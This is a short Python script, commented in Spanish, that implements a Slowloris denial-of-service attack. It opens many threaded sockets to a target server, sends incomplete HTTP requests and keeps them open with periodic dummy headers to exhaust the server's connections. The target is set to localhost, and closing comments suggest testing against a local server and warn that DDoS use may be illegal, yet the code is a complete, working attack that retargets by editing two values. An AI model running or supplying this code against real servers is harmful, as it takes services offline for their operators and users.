import socket
import time
import threading

target_host = "localhost"
target_port = 8080
num_sockets = input("Ingrese el número de sockets a utilizar: ") # si quiere hacer la prueba ingrese un numero mayor a 1000
try:
    num_sockets = int(num_sockets)
except ValueError:
    print("Por favor, ingrese un número válido.")
    exit()

def slowloris_attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n")
        while True:
            time.sleep(5)
            s.send(b"X-a: b\r\n")  
    except:
        pass

for _ in range(num_sockets):
    t = threading.Thread(target=slowloris_attack)
    t.start()
#mira aqui te dejo una parte para hacer pruebas DENTRO DE UN ENTORNO CONTROLADO
# ejecuta este comando PYTHON3 -M http.server 8080
# http://localhost:8080/
# Recuerda que el uso de DDoS puede ser ilegal y no se recomienda su uso malicioso. :3